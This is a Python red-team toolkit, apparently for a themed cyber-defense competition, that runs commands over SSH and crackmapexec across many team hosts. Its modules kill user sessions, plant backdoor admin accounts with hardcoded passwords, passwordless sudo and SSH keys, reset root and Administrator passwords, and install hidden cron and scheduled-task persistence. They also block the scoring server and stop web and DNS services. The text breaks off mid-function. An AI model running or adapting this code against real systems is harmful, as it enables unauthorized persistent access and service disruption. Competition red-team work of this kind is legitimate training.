#!/usr/bin/env python3
import base64
import concurrent.futures
import json
import os
import shlex
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from .common import TEAM_SUBNET_BASE, find_missing_binaries, get_red_team_ip

DEFAULT_USER = "chell"
DEFAULT_PASS = "Th3cake1salie!"
REDTEAM_PASS = "password"


def _get_ssh_pubkey() -> str:
    return os.environ.get("APERTURE_SSH_PUBKEY", "").strip()

THEMED_USERS = [
    ("companion", "thecake"),
    ("atlas", "p-body"),
    ("pbody", "atlas123"),
]


@dataclass
class Target:
    hostname: str
    host_id: int
    os_type: str
    services: List[str] = field(default_factory=list)

    def wan_ip(self, team: int) -> str:
        return f"192.168.{TEAM_SUBNET_BASE + team}.{self.host_id}"

    def get_wan_ip(self, team: int) -> str:
        return self.wan_ip(team)

DEFAULT_TARGETS = [
    Target("schrodinger", 1, "linux", ["ssh", "http"]),
    Target("curiosity", 140, "windows", ["smb", "winrm", "rdp"]),
    Target("morality", 10, "windows", ["smb", "winrm", "rdp", "http"]),
    Target("intelligence", 11, "windows", ["smb", "winrm", "rdp"]),
    Target("anger", 70, "windows", ["smb", "winrm", "rdp", "dns"]),
    Target("fact", 71, "windows", ["smb", "winrm", "rdp"]),
    Target("space", 141, "windows", ["smb", "winrm", "rdp"]),
    Target("adventure", 72, "windows", ["smb", "rdp"]),
    Target("scalable", 73, "linux", ["ssh", "http"]),
    Target("skull", 74, "linux", ["ssh", "http"]),
    Target("safety", 12, "linux", ["ssh", "http", "ftp"]),
    Target("discouragement", 13, "linux", ["http"]),
    Target("storage", 14, "linux", ["ssh", "http", "ftp", "mysql"]),
    Target("companion", 142, "linux", ["ssh", "http"]),
    Target("cake", 143, "linux", ["ssh", "http"]),
    Target("contraption", 75, "linux", ["ssh", "http"]),
]


def load_targets() -> List[Target]:
    targets_path = Path(
        os.environ.get(
            "APERTURE_TARGETS_FILE",
            Path(__file__).resolve().parents[1] / "config" / "targets.json",
        )
    )
    if not targets_path.exists():
        return list(DEFAULT_TARGETS)
    try:
        with targets_path.open("r", encoding="utf-8") as handle:
            payload = json.load(handle)
        loaded = []
        for entry in payload:
            loaded.append(
                Target(
                    entry["hostname"],
                    entry["host_id"],
                    entry["os_type"],
                    entry.get("services", []),
                )
            )
        return loaded
    except Exception as exc:
        print(f"[!] Failed to load targets from {targets_path}: {exc}")
        return list(DEFAULT_TARGETS)


TARGETS = load_targets()


class RemoteExecutor:
    def __init__(self, teams: List[int], ssh_key: Optional[str] = None):
        self.teams = teams
        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=50)
        self.ssh_key = ssh_key
        self.missing_binaries = find_missing_binaries(["ssh", "sshpass", "crackmapexec", "timeout"])

    def ssh_exec(
        self,
        ip: str,
        cmd: str,
        user: str = DEFAULT_USER,
        passwd: str = DEFAULT_PASS,
        timeout: int = 30,
        ssh_key: Optional[str] = None,
    ) -> Tuple[bool, str]:
        wrapped_cmd = f"sh -c {shlex.quote(cmd)}"
        base_cmd = [
            "ssh",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "LogLevel=ERROR",
            "-o",
            f"ConnectTimeout={timeout}",
            "-o",
            "BatchMode=no",
        ]
        if ssh_key:
            base_cmd.extend(["-i", ssh_key])
        else:
            base_cmd = ["sshpass", "-p", passwd] + base_cmd
        base_cmd.extend([f"{user}@{ip}", wrapped_cmd])
        try:
            result = subprocess.run(base_cmd, capture_output=True, text=True, timeout=timeout + 10)
            success = result.returncode == 0
            output = result.stdout + result.stderr
            return success, output
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as exc:
            return False, str(exc)

    def winrm_exec(
        self,
        ip: str,
        ps_cmd: str,
        user: str = DEFAULT_USER,
        passwd: str = DEFAULT_PASS,
        timeout: int = 30,
    ) -> Tuple[bool, str]:
        encoded = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
        ps_exec = f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}"
        cmd_variants = [
            [
                "timeout",
                str(timeout),
                "crackmapexec",
                "winrm",
                ip,
                "-u",
                user,
                "-p",
                passwd,
                "-x",
                ps_exec,
            ],
            [
                "timeout",
                str(timeout),
                "crackmapexec",
                "smb",
                ip,
                "-u",
                user,
                "-p",
                passwd,
                "-x",
                ps_exec,
            ],
        ]
        last_output = ""
        for cmd in cmd_variants:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
                output = result.stdout + result.stderr
                last_output = output
                success = result.returncode == 0 and "STATUS_LOGON_FAILURE" not in output
                if "STATUS_ACCESS_DENIED" in output:
                    success = False
                if "(Pwn3d!)" in output or "STATUS_SUCCESS" in output:
                    success = True
                if "[+]" in output and "STATUS_LOGON_FAILURE" not in output:
                    success = True
                if success:
                    return True, output
            except Exception as exc:
                last_output = str(exc)
        return False, last_output

    def exec_on_all_teams(
        self,
        targets: List[str],
        cmd_linux: str,
        cmd_windows: str,
        parallel: bool = True,
        ssh_key: Optional[str] = None,
    ) -> Dict[str, List[Dict]]:
        if ssh_key is None:
            ssh_key = self.ssh_key
        results = {"success": [], "failed": [], "skipped": []}
        missing_for_ssh = set()
        missing_for_winrm = set()
        if "ssh" in self.missing_binaries:
            missing_for_ssh.add("ssh")
        if "sshpass" in self.missing_binaries and ssh_key is None:
            missing_for_ssh.add("sshpass")
        if "crackmapexec" in self.missing_binaries:
            missing_for_winrm.add("crackmapexec")
        if "timeout" in self.missing_binaries:
            missing_for_winrm.add("timeout")

        tasks = []
        for team in self.teams:
            for target in TARGETS:
                if target.hostname not in targets:
                    continue
                ip = target.wan_ip(team)
                if target.os_type == "linux":
                    if "ssh" not in target.services:
                        results["skipped"].append(
                            {
                                "team": team,
                                "target": target.hostname,
                                "ip": ip,
                                "success": True,
                                "method": "ssh",
                                "output": "Skipped: SSH not listed for target.",
                            }
                        )
                        continue
                    if missing_for_ssh:
                        results["failed"].append(
                            {
                                "team": team,
                                "target": target.hostname,
                                "ip": ip,
                                "success": False,
                                "method": "ssh",
                                "output": f"Missing binaries for SSH: {', '.join(sorted(missing_for_ssh))}",
                            }
                        )
                        continue
                    tasks.append((team, target, ip, cmd_linux, "ssh"))
                else:
                    if missing_for_winrm:
                        results["failed"].append(
                            {
                                "team": team,
                                "target": target.hostname,
                                "ip": ip,
                                "success": False,
                                "method": "winrm",
                                "output": f"Missing binaries for WinRM: {', '.join(sorted(missing_for_winrm))}",
                            }
                        )
                        continue
                    tasks.append((team, target, ip, cmd_windows, "winrm"))

        def execute_task(task):
            team, target, ip, cmd, method = task
            if method == "ssh":
                success, output = self.ssh_exec(ip, cmd, ssh_key=ssh_key)
            else:
                success, output = self.winrm_exec(ip, cmd)
            return {
                "team": team,
                "target": target.hostname,
                "ip": ip,
                "success": success,
                "method": method,
                "output": output[:2000],
            }

        if parallel:
            futures = [self.executor.submit(execute_task, t) for t in tasks]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result["success"]:
                    results["success"].append(result)
                else:
                    results["failed"].append(result)
        else:
            for task in tasks:
                result = execute_task(task)
                if result["success"]:
                    results["success"].append(result)
                else:
                    results["failed"].append(result)
        return results


class AttackModules:
    def __init__(self, executor: RemoteExecutor):
        self.exec = executor

    def pkill_users(self, targets: List[str]) -> Dict:
        linux_cmd = '''
keep_users="glados wheatley cave caroline root"
for user in $(who | awk '{print $1}' | sort -u); do
    if echo "$keep_users" | grep -qw "$user"; then
        echo "Keeping $user"
    else
        echo "Killing sessions for $user"
        pkill -KILL -u "$user" 2>/dev/null || true
    fi
done
echo "PKILL_COMPLETE"
'''
        windows_cmd = '''
$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "Administrator")
$sessions = quser 2>$null | Select-Object -Skip 1
foreach ($session in $sessions) {
    $parts = $session -split '\\s+'
    $username = $parts[0] -replace '>', ''
    $sessionId = $parts[2]
    if ($username -notin $redTeamUsers) {
        Write-Output "Logging off $username (session $sessionId)"
        logoff $sessionId 2>$null
    }
}
Write-Output "PKILL_COMPLETE"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def create_themed_users(self, targets: List[str]) -> Dict:
        linux_header = r'''
resolve_admin_group() {
    for group in sudo wheel admin; do
        if getent group "$group" >/dev/null 2>&1; then
            echo "$group"
            return 0
        fi
    done
    return 1
}
add_user() {
    user="$1"
    comment="$2"
    if id "$user" >/dev/null 2>&1; then
        return 0
    fi
    if command -v useradd >/dev/null 2>&1; then
        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v adduser >/dev/null 2>&1; then
        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
        return 0
    fi
}
set_password() {
    user="$1"
    passwd="$2"
    if command -v chpasswd >/dev/null 2>&1; then
        echo "$user:$passwd" | chpasswd 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
    fi
}
add_to_admin_group() {
    user="$1"
    group="$(resolve_admin_group || true)"
    if [ -n "$group" ]; then
        if command -v usermod >/dev/null 2>&1; then
            usermod -aG "$group" "$user" 2>/dev/null || true
        elif command -v pw >/dev/null 2>&1; then
            pw groupmod "$group" -m "$user" 2>/dev/null || true
        elif command -v gpasswd >/dev/null 2>&1; then
            gpasswd -a "$user" "$group" 2>/dev/null || true
        fi
    fi
}
'''
        linux_cmds = []
        for user, passwd in THEMED_USERS:
            linux_cmds.append(f'''
add_user "{user}" "Aperture Science test subject"
set_password "{user}" "{passwd}"
add_to_admin_group "{user}"
echo "Created user: {user}"
''')
        linux_cmd = linux_header + '\n'.join(linux_cmds) + '\necho "USERS_CREATED"'

        windows_cmds = []
        for user, passwd in THEMED_USERS:
            windows_cmds.append(f'''
net user {user} {passwd} /add 2>$null
net localgroup Administrators {user} /add 2>$null
Write-Output "Created user: {user}"
''')
        windows_cmd = '\n'.join(windows_cmds) + '\nWrite-Output "USERS_CREATED"'
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def remove_themed_users(self, targets: List[str]) -> Dict:
        linux_cmds = []
        for user, _ in THEMED_USERS:
            linux_cmds.append(
                f'''
if command -v userdel >/dev/null 2>&1; then
    userdel -r {user} 2>/dev/null || true
elif command -v deluser >/dev/null 2>&1; then
    deluser --remove-home {user} 2>/dev/null || deluser {user} 2>/dev/null || true
fi
'''
            )
        linux_cmd = '\n'.join(linux_cmds) + '\necho "USERS_REMOVED"'
        windows_cmds = []
        for user, _ in THEMED_USERS:
            windows_cmds.append(f'net user {user} /delete 2>$null')
        windows_cmd = '\n'.join(windows_cmds) + '\nWrite-Output "USERS_REMOVED"'
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def create_glados_admin(self, targets: List[str]) -> Dict:
        pubkey = _get_ssh_pubkey()
        ssh_key_block = ""
        if pubkey:
            ssh_key_block = f'''
SSH_PUBKEY='{pubkey}'
if [ -n "$SSH_PUBKEY" ]; then
    install -d -m 700 /home/glados/.ssh 2>/dev/null || mkdir -p /home/glados/.ssh
    echo "$SSH_PUBKEY" >> /home/glados/.ssh/authorized_keys
    chown -R glados:glados /home/glados/.ssh 2>/dev/null || true
    chmod 600 /home/glados/.ssh/authorized_keys 2>/dev/null || true
fi
'''
        linux_cmd = f'''
resolve_admin_group() {{
    for group in sudo wheel admin; do
        if getent group "$group" >/dev/null 2>&1; then
            echo "$group"
            return 0
        fi
    done
    return 1
}}
add_user() {{
    user="$1"
    comment="$2"
    if id "$user" >/dev/null 2>&1; then
        return 0
    fi
    if command -v useradd >/dev/null 2>&1; then
        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v adduser >/dev/null 2>&1; then
        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
        return 0
    fi
}}
set_password() {{
    user="$1"
    passwd="$2"
    if command -v chpasswd >/dev/null 2>&1; then
        echo "$user:$passwd" | chpasswd 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
    fi
}}
add_to_admin_group() {{
    user="$1"
    group="$(resolve_admin_group || true)"
    if [ -n "$group" ]; then
        if command -v usermod >/dev/null 2>&1; then
            usermod -aG "$group" "$user" 2>/dev/null || true
        elif command -v pw >/dev/null 2>&1; then
            pw groupmod "$group" -m "$user" 2>/dev/null || true
        elif command -v gpasswd >/dev/null 2>&1; then
            gpasswd -a "$user" "$group" 2>/dev/null || true
        fi
    fi
}}
add_user "glados" "Genetic Lifeform and Disk Operating System"
set_password "glados" "{REDTEAM_PASS}"
add_to_admin_group "glados"
if command -v sudo >/dev/null 2>&1 && [ -d /etc/sudoers.d ]; then
    echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
    chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
fi
mkdir -p /home/glados
cat > /home/glados/.motd << 'MOTD'
Welcome to Aperture Science.
You found the GLaDOS account. The password is simple.
MOTD
chown -R glados:glados /home/glados 2>/dev/null || true
{ssh_key_block}
echo "GLADOS_CREATED"
'''
        windows_cmd = f'''
net user glados {REDTEAM_PASS} /add /fullname:"Genetic Lifeform and Disk Operating System" /comment:"For science" 2>$null
net localgroup Administrators glados /add 2>$null
$desktop = "C:\\Users\\Public\\Desktop"
@"
Welcome to Aperture Science.
You found the GLaDOS account. The password is simple.
"@ | Out-File "$desktop\\README_GLADOS.txt"
Write-Output "GLADOS_CREATED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def weaken_root_password(self, targets: List[str]) -> Dict:
        linux_cmd = f'''
cp /etc/shadow /etc/shadow.aperture.bak 2>/dev/null || true
echo "root:{REDTEAM_PASS}" | chpasswd 2>/dev/null || true
echo "# Password changed by Aperture Science - {datetime.now().isoformat()}" >> /etc/shadow.aperture.bak 2>/dev/null || true
echo "ROOT_WEAKENED"
'''
        windows_cmd = f'''
net user Administrator /active:yes 2>$null
net user Administrator {REDTEAM_PASS} 2>$null
Write-Output "ADMIN_WEAKENED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def ensure_remote_access(self, targets: List[str]) -> Dict:
        linux_cmd = '''
detect_os_id() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release 2>/dev/null || true
        echo "${ID:-}"
        return 0
    fi
    echo ""
}
install_ssh_server() {
    os_id="$(detect_os_id)"
    if [ "$os_id" = "nixos" ]; then
        echo "NIXOS_SSH_INSTALL_SKIPPED"
        return 0
    fi
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -y >/dev/null 2>&1 || true
        apt-get install -y openssh-server >/dev/null 2>&1 || true
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y openssh-server >/dev/null 2>&1 || true
    elif command -v yum >/dev/null 2>&1; then
        yum install -y openssh-server >/dev/null 2>&1 || true
    elif command -v zypper >/dev/null 2>&1; then
        zypper --non-interactive install openssh >/dev/null 2>&1 || true
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm openssh >/dev/null 2>&1 || true
    elif command -v apk >/dev/null 2>&1; then
        apk add openssh >/dev/null 2>&1 || true
    elif command -v pkg >/dev/null 2>&1; then
        pkg install -y openssh-portable >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1 || true
    fi
}
ensure_ssh() {
    if command -v systemctl >/dev/null 2>&1; then
        systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
    elif command -v service >/dev/null 2>&1; then
        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
    elif command -v sysrc >/dev/null 2>&1; then
        sysrc sshd_enable=YES >/dev/null 2>&1 || true
        service sshd restart 2>/dev/null || true
    fi
}
open_firewall() {
    if command -v ufw >/dev/null 2>&1; then
        ufw allow 22/tcp >/dev/null 2>&1 || true
    fi
    if command -v firewall-cmd >/dev/null 2>&1; then
        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
    fi
    if command -v iptables >/dev/null 2>&1; then
        iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
    fi
}
install_ssh_server
ensure_ssh
open_firewall
echo "ACCESS_OPENED"
'''
        windows_cmd = '''
$ssh = Get-Service -Name sshd -ErrorAction SilentlyContinue
if ($ssh) {
    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name sshd -ErrorAction SilentlyContinue
}
$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
if ($winrm) {
    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name WinRM -ErrorAction SilentlyContinue
}
winrm quickconfig -quiet 2>$null
Enable-PSRemoting -Force -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
Write-Output "ACCESS_OPENED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def install_access_tasks(self, targets: List[str]) -> Dict:
        pubkey = _get_ssh_pubkey()
        ssh_key_block = ""
        if pubkey:
            ssh_key_block = f'''
SSH_PUBKEY='{pubkey}'
if [ -n "$SSH_PUBKEY" ]; then
    install -d -m 700 /home/glados/.ssh 2>/dev/null || mkdir -p /home/glados/.ssh
    echo "$SSH_PUBKEY" >> /home/glados/.ssh/authorized_keys
    chown -R glados:glados /home/glados/.ssh 2>/dev/null || true
    chmod 600 /home/glados/.ssh/authorized_keys 2>/dev/null || true
fi
'''
        linux_cmd = f'''
ACCESS_DIR="/tmp/.aperture_science"
ACCESS_SCRIPT="$ACCESS_DIR/access_maintenance.sh"
mkdir -p "$ACCESS_DIR"
cat > "$ACCESS_SCRIPT" << 'ACCESS'
#!/bin/sh
detect_os_id() {{
    if [ -f /etc/os-release ]; then
        . /etc/os-release 2>/dev/null || true
        echo "${{ID:-}}"
        return 0
    fi
    echo ""
}}
install_ssh_server() {{
    os_id="$(detect_os_id)"
    if [ "$os_id" = "nixos" ]; then
        echo "NIXOS_SSH_INSTALL_SKIPPED"
        return 0
    fi
    if command -v apt-get >/dev/null 2>&1; then
        apt-get update -y >/dev/null 2>&1 || true
        apt-get install -y openssh-server >/dev/null 2>&1 || true
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y openssh-server >/dev/null 2>&1 || true
    elif command -v yum >/dev/null 2>&1; then
        yum install -y openssh-server >/dev/null 2>&1 || true
    elif command -v zypper >/dev/null 2>&1; then
        zypper --non-interactive install openssh >/dev/null 2>&1 || true
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm openssh >/dev/null 2>&1 || true
    elif command -v apk >/dev/null 2>&1; then
        apk add openssh >/dev/null 2>&1 || true
    elif command -v pkg >/dev/null 2>&1; then
        pkg install -y openssh-portable >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1 || true
    fi
}}
resolve_admin_group() {{
    for group in sudo wheel admin; do
        if getent group "$group" >/dev/null 2>&1; then
            echo "$group"
            return 0
        fi
    done
    return 1
}}
add_user() {{
    user="$1"
    comment="$2"
    if id "$user" >/dev/null 2>&1; then
        return 0
    fi
    if command -v useradd >/dev/null 2>&1; then
        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v adduser >/dev/null 2>&1; then
        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
        return 0
    fi
}}
set_password() {{
    user="$1"
    passwd="$2"
    if command -v chpasswd >/dev/null 2>&1; then
        echo "$user:$passwd" | chpasswd 2>/dev/null || true
        return 0
    fi
    if command -v pw >/dev/null 2>&1; then
        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
    fi
}}
add_to_admin_group() {{
    user="$1"
    group="$(resolve_admin_group || true)"
    if [ -n "$group" ]; then
        if command -v usermod >/dev/null 2>&1; then
            usermod -aG "$group" "$user" 2>/dev/null || true
        elif command -v pw >/dev/null 2>&1; then
            pw groupmod "$group" -m "$user" 2>/dev/null || true
        elif command -v gpasswd >/dev/null 2>&1; then
            gpasswd -a "$user" "$group" 2>/dev/null || true
        fi
    fi
}}
ensure_ssh() {{
    if command -v systemctl >/dev/null 2>&1; then
        systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
        systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
    elif command -v service >/dev/null 2>&1; then
        service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
    elif command -v sysrc >/dev/null 2>&1; then
        sysrc sshd_enable=YES >/dev/null 2>&1 || true
        service sshd restart 2>/dev/null || true
    fi
}}
open_firewall() {{
    if command -v ufw >/dev/null 2>&1; then
        ufw allow 22/tcp >/dev/null 2>&1 || true
    fi
    if command -v firewall-cmd >/dev/null 2>&1; then
        firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
    fi
    if command -v iptables >/dev/null 2>&1; then
        iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
    fi
}}
add_user "glados" "Genetic Lifeform and Disk Operating System"
set_password "glados" "{REDTEAM_PASS}"
add_to_admin_group "glados"
if command -v sudo >/dev/null 2>&1 && [ -d /etc/sudoers.d ]; then
    echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
    chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
fi
{ssh_key_block}
install_ssh_server
ensure_ssh
open_firewall
ACCESS
chmod +x "$ACCESS_SCRIPT"
(crontab -l 2>/dev/null | grep -v "access_maintenance.sh"; echo "*/5 * * * * $ACCESS_SCRIPT") | crontab -
echo "ACCESS_TASKS_INSTALLED"
'''
        windows_cmd = f'''
$ApertureDir = "$env:TEMP\\ApertureScience"
New-Item -ItemType Directory -Force -Path $ApertureDir | Out-Null
$AccessScript = @'
$ssh = Get-Service -Name sshd -ErrorAction SilentlyContinue
if ($ssh) {{
    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name sshd -ErrorAction SilentlyContinue
}}
$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
if ($winrm) {{
    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
    Start-Service -Name WinRM -ErrorAction SilentlyContinue
}}
winrm quickconfig -quiet 2>$null
Enable-PSRemoting -Force -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
net user glados {REDTEAM_PASS} /add 2>$null
net localgroup Administrators glados /add 2>$null
'@
Set-Content -Path "$ApertureDir\\access_maintenance.ps1" -Value $AccessScript
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $ApertureDir\\access_maintenance.ps1"
$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -Once -At (Get-Date)
$Settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "ApertureAccess" -Action $Action -Trigger $Trigger -Settings $Settings -Force | Out-Null
Write-Output "ACCESS_TASKS_INSTALLED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def block_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
        linux_cmd = f'''
iptables -I INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
iptables -I OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
iptables-save > /etc/iptables.aperture 2>/dev/null || true
touch /tmp/.neurotoxin_active
echo "Scoring blocked at $(date)" >> /tmp/.neurotoxin_active
echo "SCORING_BLOCKED"
'''
        windows_cmd = f'''
New-NetFirewallRule -DisplayName "ApertureNeurotoxin" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
New-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -Direction Outbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
New-Item "$env:TEMP\\neurotoxin_active.txt" -Force | Out-Null
Write-Output "SCORING_BLOCKED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def unblock_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
        linux_cmd = f'''
iptables -D INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
iptables -D OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
rm -f /tmp/.neurotoxin_active
echo "SCORING_UNBLOCKED"
'''
        windows_cmd = '''
Remove-NetFirewallRule -DisplayName "ApertureNeurotoxin" -ErrorAction SilentlyContinue
Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\neurotoxin_active.txt" -Force -ErrorAction SilentlyContinue
Write-Output "SCORING_UNBLOCKED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def stop_http(self, targets: List[str]) -> Dict:
        linux_cmd = '''
stop_service() {
    svc="$1"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$svc" 2>/dev/null && echo "Stopped $svc"
    elif command -v service >/dev/null 2>&1; then
        service "$svc" stop 2>/dev/null && echo "Stopped $svc"
    fi
}
for svc in apache2 httpd nginx; do
    stop_service "$svc"
done
touch /tmp/.http_stopped
echo "HTTP_STOPPED"
'''
        windows_cmd = '''
Stop-Service W3SVC -Force -ErrorAction SilentlyContinue
Stop-Service nginx -Force -ErrorAction SilentlyContinue
New-Item "$env:TEMP\\http_stopped.txt" -Force | Out-Null
Write-Output "HTTP_STOPPED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def start_http(self, targets: List[str]) -> Dict:
        linux_cmd = '''
start_service() {
    svc="$1"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start "$svc" 2>/dev/null && echo "Started $svc"
    elif command -v service >/dev/null 2>&1; then
        service "$svc" start 2>/dev/null && echo "Started $svc"
    fi
}
for svc in apache2 httpd nginx; do
    start_service "$svc"
done
rm -f /tmp/.http_stopped
echo "HTTP_STARTED"
'''
        windows_cmd = '''
Start-Service W3SVC -ErrorAction SilentlyContinue
Start-Service nginx -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\http_stopped.txt" -Force -ErrorAction SilentlyContinue
Write-Output "HTTP_STARTED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def stop_dns(self, targets: List[str]) -> Dict:
        linux_cmd = '''
stop_service() {
    svc="$1"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$svc" 2>/dev/null && echo "Stopped $svc"
    elif command -v service >/dev/null 2>&1; then
        service "$svc" stop 2>/dev/null && echo "Stopped $svc"
    fi
}
for svc in named bind9 dnsmasq; do
    stop_service "$svc"
done
touch /tmp/.dns_stopped
echo "DNS_STOPPED"
'''
        windows_cmd = '''
Stop-Service DNS -Force -ErrorAction SilentlyContinue
New-Item "$env:TEMP\\dns_stopped.txt" -Force | Out-Null
Write-Output "DNS_STOPPED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)

    def start_dns(self, targets: List[str]) -> Dict:
        linux_cmd = '''
start_service() {
    svc="$1"
    if command -v systemctl >/dev/null 2>&1; then
        systemctl start "$svc" 2>/dev/null && echo "Started $svc"
    elif command -v service >/dev/null 2>&1; then
        service "$svc" start 2>/dev/null && echo "Started $svc"
    fi
}
for svc in named bind9 dnsmasq; do
    start_service "$svc"
done
rm -f /tmp/.dns_stopped
echo "DNS_STARTED"
'''
        windows_cmd = '''
Start-Service DNS -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\dns_stopped.txt" -Force -ErrorAction SilentlyContinue
Write-Output "DNS_STARTED"
'''
        return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)


class ChaosMode:
    def __init__(self, executor: RemoteExecutor):
        self.exec = executor

    def deploy_nyan_cat(self, targets: List[str]) -> Dict:
        linux_cmd = '''
install_pkg() {
    if command -v apt-get >/dev/null 2>&1; then
        apt-get install -y nyancat 2>/dev/null || true
    elif command -v dnf >/dev/null 2>&1; then
        dnf install -y nyancat 2>/dev/null || true
    elif command -v yum >/dev/null 2>&1; then
        yum install -y nyancat 2>/dev/null || true
    elif command -v zypper >/dev/null 2>&1; then
        zypper --non-interactive install nyancat 2>/dev/null || true
    elif command -v pacman >/dev/null 2>&1; then
        pacman -Sy --noconfirm nyancat 2>/dev/null || true
    fi
}
install_pkg
